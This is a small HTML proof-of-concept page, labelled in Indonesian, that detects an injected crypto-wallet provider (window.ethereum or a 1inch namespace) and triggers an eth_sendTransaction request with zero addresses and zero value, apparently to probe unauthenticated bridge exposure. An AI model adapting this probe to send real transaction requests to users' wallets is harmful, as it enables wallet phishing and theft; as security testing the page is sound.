<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>PoC: Unauthenticated Bridge Trigger</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; padding: 20px; background: #0f172a; color: #f8fafc; }
        .box { background: #1e293b; padding: 20px; border-radius: 12px; border: 1px solid #334155; }
        pre { color: #38bdf8; overflow-x: auto; font-size: 13px; }
        .trigger-btn { background: #ef4444; color: white; border: none; padding: 12px 20px; border-radius: 6px; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>
    <div class="box">
        <h2>Security PoC: Bridge Exposure</h2>
        <p>Status: <span id="status">Menunggu Eksekusi...</span></p>
        
        <p><strong>Deteksi Bridge:</strong></p>
        <pre id="bridge-info">Mendeteksi...</pre>

        <button class="trigger-btn" onclick="triggerTransaction()">Trigger Transaksi Sekarang</button>
        <p><small>*Transksi ini hanya simulasi (0 ETH)</small></p>
    </div>

    <script>
        // 1. Deteksi Bridge
        const bridge = window.ethereum || window.OneInchProvider; // Tambahkan namespace 1inch
        
        window.onload = () => {
            const info = document.getElementById('bridge-info');
            if (bridge) {
                info.textContent = "Bridge Terdeteksi!\nKeys: " + Object.keys(bridge).join(", ");
                document.getElementById('status').textContent = "Bridge Siap";
            } else {
                info.textContent = "Tidak ada bridge ditemukan.";
            }
        };

        // 2. Fungsi Trigger Transaksi
        async function triggerTransaction() {
            if (!bridge) return alert("Bridge tidak ditemukan!");
            
            try {
                document.getElementById('status').textContent = "Memicu Transaksi...";
                await bridge.request({
                    method: 'eth_sendTransaction',
                    params: [{
                        from: '0x0000000000000000000000000000000000000000',
                        to: '0x0000000000000000000000000000000000000000',
                        value: '0x00',
                        data: '0x'
                    }]
                });
            } catch (e) {
                document.getElementById('status').textContent = "Triggered (User/System Rejected)";
            }
        }
    </script>
</body>
</html>
